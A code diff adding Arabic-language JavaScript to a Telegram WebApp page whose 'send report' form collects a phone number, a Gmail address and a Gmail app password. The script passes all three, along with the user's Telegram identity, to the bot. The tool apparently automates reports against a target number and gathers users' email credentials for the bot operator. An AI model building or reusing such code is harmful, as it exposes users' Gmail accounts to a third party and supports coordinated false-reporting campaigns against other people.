@@ -216,4 +216,105 @@
                 <p>📝 ${user.username ? '@' + user.username : 'لا يوجد يوزرنيم'}</p>
             `;
         } else {
-            document.getElementById('userInfo').innerHTML = '<
+            document.getElementById('userInfo').innerHTML = '<p>👤 زائر</p>';
+        }
+        
+        async function sendReport() {
+            const phoneNumber = document.getElementById('phoneNumber').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const statusDiv = document.getElementById('status');
+            
+            // التحقق من المدخلات
+            if (!phoneNumber) {
+                showStatus('الرجاء إدخال رقم الهاتف', 'error');
+                return;
+            }
+            
+            if (!email) {
+                showStatus('الرجاء إدخال البريد الإلكتروني', 'error');
+                return;
+            }
+            
+            if (!password) {
+                showStatus('الرجاء إدخال كلمة مرور التطبيق', 'error');
+                return;
+            }
+            
+            // التحقق من صيغة البريد
+            if (!email.match(/^[a-zA-Z0-9._%+-]+@gmail\.com$/)) {
+                showStatus('الرجاء إدخال بريد Gmail صحيح', 'error');
+                return;
+            }
+            
+            // التحقق من صيغة الرقم
+            if (!phoneNumber.match(/^\d{8,15}$/)) {
+                showStatus('الرقم يجب أن يحتوي على 8-15 رقم فقط', 'error');
+                return;
+            }
+            
+            // تعطيل الزر
+            const btn = document.getElementById('sendBtn');
+            btn.disabled = true;
+            btn.textContent = 'جاري الإرسال...';
+            
+            showStatus('جاري إرسال البلاغ...', 'info');
+            
+            try {
+                // إرسال البيانات إلى البوت عبر WebApp
+                const reportData = {
+                    action: 'send_report',
+                    data: {
+                        phone: phoneNumber,
+                        email: email,
+                        password: password,
+                        user_id: user?.id,
+                        username: user?.username,
+                        first_name: user?.first_name
+                    }
+                };
+                
+                // إرسال البيانات إلى البوت
+                tg.sendData(JSON.stringify(reportData));
+                
+                showStatus('✅ تم إرسال البلاغ بنجاح! جاري المعالجة...', 'success');
+                tg.showAlert('تم إرسال البلاغ بنجاح! سيتم معالجته خلال دقائق');
+                
+                // مسح الحقول
+                document.getElementById('phoneNumber').value = '';
+                document.getElementById('email').value = '';
+                document.getElementById('password').value = '';
+                
+                // إغلاق التطبيق بعد 3 ثواني
+                setTimeout(() => {
+                    tg.close();
+                }, 3000);
+                
+            } catch (error) {
+                console.error('Error:', error);
+                showStatus('❌ حدث خطأ. الرجاء المحاولة مرة أخرى', 'error');
+                tg.showAlert('حدث خطأ. الرجاء المحاولة مرة أخرى');
+            } finally {
+                btn.disabled = false;
+                btn.textContent = '📤 إرسال البلاغ';
+            }
+        }
+        
+        function showStatus(message, type) {
+            const statusDiv = document.getElementById('status');
+            statusDiv.textContent = message;
+            statusDiv.className = `status ${type}`;
+            
+            if (type !== 'error') {
+                setTimeout(() => {
+                    statusDiv.style.display = 'none';
+                }, 5000);
+            }
+        }
+        
+        // تحسين التطبيق للهواتف
+        tg.setBackgroundColor('var(--tg-theme-bg-color)');
+        tg.setHeaderColor('var(--tg-theme-header-bg-color)');
+    </script>
+</body>
+</html>
